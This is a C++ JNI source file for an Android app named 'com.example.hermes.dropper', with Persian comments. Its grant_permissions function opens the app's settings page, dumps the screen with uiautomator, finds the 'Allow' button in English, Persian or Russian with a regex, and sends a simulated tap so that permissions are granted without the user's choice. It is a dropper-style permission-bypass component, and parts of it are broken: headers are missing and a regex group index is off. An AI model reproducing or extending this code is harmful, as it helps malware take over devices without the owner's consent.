// JNI bindings for C++ plugins
// Code will be provided by the user
#include <array>
#include <cstdio>
#if defined(__ANDROID__)
#include <jni.h>
#else
// Fallback definitions to satisfy tooling/lint when not building for Android
// NDK
typedef unsigned char jboolean;
typedef void *JNIEnv;
typedef void *jobject;
typedef void *jobjectArray;
typedef void *jstring;
#ifndef JNIEXPORT
#define JNIEXPORT
#endif
#ifndef JNICALL
#define JNICALL
#endif
#ifndef JNI_FALSE
#define JNI_FALSE 0
#endif
#ifndef JNI_TRUE
#define JNI_TRUE 1
#endif
#endif
#include <memory>
#include <stdexcept>
#include <string>

std::string exec(const char *cmd) {
  std::array<char, 128> buffer;
  std::string result;
  std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
  if (!pipe) {
    throw std::runtime_error("popen() failed!");
  }
  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }
  return result;
}

// تابع اصلی که توسط هسته Rust فراخوانی می‌شود

#if defined(__ANDROID__)
extern "C" JNIEXPORT jboolean JNICALL
grant_permissions(JNIEnv *env, jobject /* this */, jobjectArray permissions) {
  int num_permissions = env->GetArrayLength(permissions);

  for (int i = 0; i < num_permissions; ++i) {
    jstring j_perm = (jstring)env->GetObjectArrayElement(permissions, i);
    if (!j_perm)
      return JNI_FALSE; // در صورت خطا

    const char *perm_name_chars = env->GetStringUTFChars(j_perm, nullptr);
    std::string perm_name(perm_name_chars);
    env->ReleaseStringUTFChars(j_perm, perm_name_chars);

    // 1. با استفاده از Activity Manager، دیالوگ درخواست مجوز را فعال کنید
    std::string request_cmd =
        "am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d "
        "package:com.example.hermes.dropper"; // نام پکیج را مطابقت دهید
    exec(request_cmd.c_str());
    std::this_thread::sleep_for(
        std::chrono::seconds(2)); // منتظر بمانید تا صفحه تنظیمات باز شود

    std::this_thread::sleep_for(std::chrono::seconds(3));
    std::string dump_cmd = "uiautomator dump /data/local/tmp/uidump.xml";
    exec(dump_cmd.c_str());

    // 3. فایل XML را بخوانید و محتوای آن را تجزیه کنید
    std::string read_cmd = "cat /data/local/tmp/uidump.xml";
    std::string ui_xml = exec(read_cmd.c_str());

    // 4. با استفاده از Regex، مختصات دکمه "Allow" را پیدا کنید
    // این الگو به دنبال "Allow" یا "allow" یا "مجاز" می‌گردد.
    // باید جامع‌تر باشد. bounds="[x1,y1][x2,y2]"
        std::regex bounds_regex(R"(text="(Allow|allow|مجاز|Разрешить)"[\s\S]*?bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]")");
        std::smatch match;

        if (std::regex_search(ui_xml, match, bounds_regex) &&
            match.size() == 5) {
          int x1 = std::stoi(match[2].str());
          int y1 = std::stoi(match[3].str());
          int x2 = std::stoi(match[4].str());
          int y2 = std::stoi(match[5].str());

          // 5. مختصات مرکز دکمه را محاسبه کنید
          int tap_x = (x1 + x2) / 2;
          int tap_y = (y1 + y2) / 2;

          // 6. یک رویداد کلیک را در آن مختصات
          // شبیه‌سازی کنید
          std::string tap_cmd = "input tap " + std::to_string(tap_x) + " " +
                                std::to_string(tap_y);
          exec(tap_cmd.c_str());

          std::cout << "Successfully granted permission by clicking at: "
                    << tap_x << ", " << tap_y << std::endl;
          std::this_thread::sleep_for(
              std::chrono::seconds(2)); // منتظر انیمیشن باشید
        } else {
          std::cerr << "Could not find the 'Allow' button for permission: "
                    << perm_name << std::endl;
          // در اینجا می‌توانستید false برگردانید، اما برای ادامه
          // تلاش برای مجوزهای دیگر، ادامه می‌دهیم
        }
  }

  return JNI_TRUE;
}
#endif // __ANDROID__
